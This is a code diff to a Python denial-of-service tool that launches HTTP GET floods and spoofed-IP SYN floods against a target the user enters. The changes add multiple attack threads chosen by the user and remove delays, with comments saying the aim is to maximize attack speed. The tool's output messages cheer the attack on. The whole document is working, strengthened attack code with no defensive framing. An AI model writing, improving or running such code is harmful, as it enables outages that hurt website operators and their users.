@@ -1,4 +1,3 @@
-from ast import Pass
 from time import sleep
 from requests import get as requests_get
 from time import localtime, strftime
@@ -28,19 +27,21 @@ def http_get_flood(target, packet_size):
     if packet_size == "u":
         print("===== The HTTP GET Flood attack started :)")
         while True:
-            named_tuple = localtime() # get struct_time
+            named_tuple = localtime()  # get struct_time
             time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
-            r = requests_get("http://"+target)
+            r = requests_get("http://" + target)
             print(f"[{time_string}] Packet was sent ({count})")
             count += 1
+            sleep(0)  # Reduce sleep time to maximize attack speed
     elif int(packet_size) >= 1:
         print("===== The HTTP GET Flood attack started :)")
         while count <= int(packet_size):
-            named_tuple = localtime() # get struct_time
+            named_tuple = localtime()  # get struct_time
             time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
-            r = requests_get("http://"+target)
+            r = requests_get("http://" + target)
             print(f"[{time_string}] Packet was sent ({count})")
             count += 1
+            sleep(0)  # Reduce sleep time to maximize attack speed
         print("HTTP GET Flood attack finished!")
     else:
         print("Error: Please enter the correct number of packets.")
@@ -75,6 +76,7 @@ def syn_flood(target_ip, fake_ip):
 
         packet = ip_header + tcp_header
         sock.sendto(packet, (target_ip, 0))
+        sleep(0)  # Reduce sleep time to maximize attack speed
 
 def main():
     print_banner()
@@ -82,6 +84,10 @@ def main():
     target = input("-- Target URL: ")
     packet_size = input("-- Packet Size (\"u\" = unlimited): ")
     fake_ip = input("-- Fake IP (or leave empty for auto-generate): ") or '.'.join([str(randint(0, 255)) for _ in range(4)])
+    
+    # Get number of threads for each attack type
+    http_threads_count = int(input("-- Number of HTTP GET Flood threads: "))
+    syn_threads_count = int(input("-- Number of SYN Flood threads: "))
     
     if target.startswith("http://"):
         target = target[7:]
@@ -93,18 +99,27 @@ def main():
         requests_get("http://" + target)
     except:
         print("Error: Invalid site address.")
-        sleep(5)
+        sleep(0)
         return
     
-    # Start HTTP GET Flood and SYN Flood attacks
-    http_thread = threading.Thread(target=http_get_flood, args=(target, packet_size))
-    syn_thread = threading.Thread(target=syn_flood, args=(target, fake_ip))
+    # Start HTTP GET Flood and SYN Flood attacks with specified number of threads
+    http_threads = []
+    for _ in range(http_threads_count):
+        http_thread = threading.Thread(target=http_get_flood, args=(target, packet_size))
+        http_thread.start()
+        http_threads.append(http_thread)
     
-    http_thread.start()
-    syn_thread.start()
+    syn_threads = []
+    for _ in range(syn_threads_count):
+        syn_thread = threading.Thread(target=syn_flood, args=(target, fake_ip))
+        syn_thread.start()
+        syn_threads.append(syn_thread)
     
-    http_thread.join()
-    syn_thread.join()
+    # Optionally join threads if you want the main program to wait for them to finish
+    for thread in http_threads:
+        thread.join()
+    for thread in syn_threads:
+        thread.join()
 
 if __name__ == "__main__":
     main()
